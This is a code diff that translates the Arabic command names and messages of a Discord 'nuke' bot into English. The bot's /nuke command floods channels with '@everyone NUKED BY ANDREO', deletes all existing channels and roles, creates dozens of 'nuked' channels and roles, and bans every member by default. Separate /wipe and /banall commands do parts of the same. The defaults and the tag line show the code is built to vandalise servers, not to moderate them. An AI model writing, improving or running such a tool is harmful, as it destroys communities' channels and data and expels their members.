@@ -88,39 +88,39 @@ async function spamMessages(guild, message, count, speed) {
 // ---------- slash commands ----------
 const commands = [
   new SlashCommandBuilder()
-    .setName('نيوك')
-    .setDescription('النيوك الكامل — تحكم بكل شي')
+    .setName('nuke')
+    .setDescription('Full server nuke with custom options')
     .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
     .addStringOption(o =>
-      o.setName('اسم_القنوات').setDescription('اسم القنوات اللي راح تنصنع').setRequired(false))
+      o.setName('channel_name').setDescription('Name for the new channels').setRequired(false))
     .addStringOption(o =>
-      o.setName('اسم_الرتب').setDescription('اسم الرتب اللي راح تنصنع').setRequired(false))
+      o.setName('role_name').setDescription('Name for the new roles').setRequired(false))
     .addStringOption(o =>
-      o.setName('الرسالة').setDescription('الرسالة اللي راح تنرسل سبام').setRequired(false))
+      o.setName('message').setDescription('Message to spam in channels').setRequired(false))
     .addIntegerOption(o =>
-      o.setName('عدد_القنوات').setDescription('كم قناة تنصنع (افتراضي 30)').setMinValue(1).setMaxValue(100).setRequired(false))
+      o.setName('channel_count').setDescription('How many channels to create (default 30)').setMinValue(1).setMaxValue(100).setRequired(false))
     .addIntegerOption(o =>
-      o.setName('عدد_الرتب').setDescription('كم رتبة تنصنع (افتراضي 30)').setMinValue(1).setMaxValue(100).setRequired(false))
+      o.setName('role_count').setDescription('How many roles to create (default 30)').setMinValue(1).setMaxValue(100).setRequired(false))
     .addIntegerOption(o =>
-      o.setName('عدد_الرسائل').setDescription('كم رسالة سبام بكل قناة (افتراضي 10)').setMinValue(1).setMaxValue(50).setRequired(false))
+      o.setName('message_count').setDescription('Spam messages per channel (default 10)').setMinValue(1).setMaxValue(50).setRequired(false))
     .addIntegerOption(o =>
-      o.setName('السرعة').setDescription('تأخير بالمللي ثانية بين كل عملية (افتراضي 0)').setMinValue(0).setMaxValue(5000).setRequired(false))
+      o.setName('speed').setDescription('Delay in ms between actions (default 0)').setMinValue(0).setMaxValue(5000).setRequired(false))
     .addBooleanOption(o =>
-      o.setName('باند_الكل').setDescription('يبند كل الأعضاء؟ (افتراضي نعم)').setRequired(false))
+      o.setName('ban_all').setDescription('Ban every member? (default yes)').setRequired(false))
     .addBooleanOption(o =>
-      o.setName('مسح_القنوات').setDescription('يمسح القنوات الموجودة؟ (افتراضي نعم)').setRequired(false))
+      o.setName('wipe_channels').setDescription('Delete existing channels? (default yes)').setRequired(false))
     .addBooleanOption(o =>
-      o.setName('مسح_الرتب').setDescription('يمسح الرتب الموجودة؟ (افتراضي نعم)').setRequired(false))
+      o.setName('wipe_roles').setDescription('Delete existing roles? (default yes)').setRequired(false))
     .addBooleanOption(o =>
-      o.setName('تغيير_الاسماء').setDescription('يغير أسماء القنوات الحالية قبل المسح؟ (افتراضي لا)').setRequired(false))
+      o.setName('rename_channels').setDescription('Rename existing channels before wiping? (default no)').setRequired(false))
     .addBooleanOption(o =>
-      o.setName('سبام_الرسائل').setDescription('يرسل رسائل سبام قبل المسح؟ (افتراضي نعم)').setRequired(false)),
+      o.setName('spam_messages').setDescription('Spam messages before wiping? (default yes)').setRequired(false)),
 
-  new SlashCommandBuilder().setName('wipe').setDescription('يمسح القنوات والرتب فقط')
+  new SlashCommandBuilder().setName('wipe').setDescription('Delete channels and roles only')
     .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
-  new SlashCommandBuilder().setName('banall').setDescription('يبند الكل')
+  new SlashCommandBuilder().setName('banall').setDescription('Ban everyone')
     .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
-  new SlashCommandBuilder().setName('stop').setDescription('يوقف البوت')
+  new SlashCommandBuilder().setName('stop').setDescription('Stop the bot')
     .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
 ].map(c => c.toJSON());
 
@@ -143,27 +143,27 @@ client.on('interactionCreate', async (interaction) => {
   if (!guild) return;
 
   if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-    return interaction.reply({ content: 'تحتاج صلاحية أدمن.', ephemeral: true });
+    return interaction.reply({ content: 'You need Administrator permission.', ephemeral: true });
   }
 
-  // ============ /نيوك ============
-  if (commandName === 'نيوك') {
+  // ============ /nuke ============
+  if (commandName === 'nuke') {
     await interaction.deferReply({ ephemeral: true });
 
-    const chName    = interaction.options.getString('اسم_القنوات')  || 'nuked-by-andreo';
-    const roleName  = interaction.options.getString('اسم_الرتب')    || 'nuked';
-    const msgText   = interaction.options.getString('الرسالة')       || '@everyone NUKED BY ANDREO';
-    const chCount   = interaction.options.getInteger('عدد_القنوات')  ?? 30;
-    const roleCount = interaction.options.getInteger('عدد_الرتب')    ?? 30;
-    const msgCount  = interaction.options.getInteger('عدد_الرسائل')  ?? 10;
-    const speed     = interaction.options.getInteger('السرعة')       ?? 0;
-    const doBan     = interaction.options.getBoolean('باند_الكل')      ?? true;
-    const doWipeCh  = interaction.options.getBoolean('مسح_القنوات')    ?? true;
-    const doWipeRl  = interaction.options.getBoolean('مسح_الرتب')      ?? true;
-    const doRename  = interaction.options.getBoolean('تغيير_الاسماء')  ?? false;
-    const doSpamMsg = interaction.options.getBoolean('سبام_الرسائل')   ?? true;
+    const chName    = interaction.options.getString('channel_name')   || 'nuked-by-andreo';
+    const roleName  = interaction.options.getString('role_name')      || 'nuked';
+    const msgText   = interaction.options.getString('message')        || '@everyone NUKED BY ANDREO';
+    const chCount   = interaction.options.getInteger('channel_count') ?? 30;
+    const roleCount = interaction.options.getInteger('role_count')    ?? 30;
+    const msgCount  = interaction.options.getInteger('message_count') ?? 10;
+    const speed     = interaction.options.getInteger('speed')         ?? 0;
+    const doBan     = interaction.options.getBoolean('ban_all')       ?? true;
+    const doWipeCh  = interaction.options.getBoolean('wipe_channels') ?? true;
+    const doWipeRl  = interaction.options.getBoolean('wipe_roles')    ?? true;
+    const doRename  = interaction.options.getBoolean('rename_channels') ?? false;
+    const doSpamMsg = interaction.options.getBoolean('spam_messages') ?? true;
 
-    await interaction.editReply({ content: 'بدأ التنفيذ...' });
+    await interaction.editReply({ content: 'Execution started...' });
 
     try {
       if (doSpamMsg) await spamMessages(guild, msgText, msgCount, speed);
@@ -174,30 +174,30 @@ client.on('interactionCreate', async (interaction) => {
       if (doWipeRl) await wipeRoles(guild, speed);
       if (doBan)    await banAll(guild, speed);
 
-      // ما نقدر نرسل رد بعد النيوك لأن القناة انمسحت — بس نحاول
-      await interaction.editReply({ content: 'تم النيوك ✅' }).catch(() => {});
+      // Try to send completion message (might fail if channel was deleted)
+      await interaction.editReply({ content: 'Nuke complete ✅' }).catch(() => {});
     } catch (err) {
-      await interaction.editReply({ content: `خطأ: ${err.message}` }).catch(() => {});
+      await interaction.editReply({ content: `Error: ${err.message}` }).catch(() => {});
     }
     return;
   }
 
-  // ============ أوامر بسيطة ============
+  // ============ Simple commands ============
   if (commandName === 'wipe') {
-    await interaction.reply({ content: 'بدأ المسح...', ephemeral: true });
+    await interaction.reply({ content: 'Wiping started...', ephemeral: true });
     await wipeChannels(guild, 0);
     await wipeRoles(guild, 0);
     return;
   }
 
   if (commandName === 'banall') {
-    await interaction.reply({ content: 'بدأ الباند...', ephemeral: true });
+    await interaction.reply({ content: 'Banning started...', ephemeral: true });
     await banAll(guild, 0);
     return;
   }
 
   if (commandName === 'stop') {
-    await interaction.reply({ content: 'إيقاف...', ephemeral: true });
+    await interaction.reply({ content: 'Shutting down...', ephemeral: true });
     process.exit(0);
   }
 });
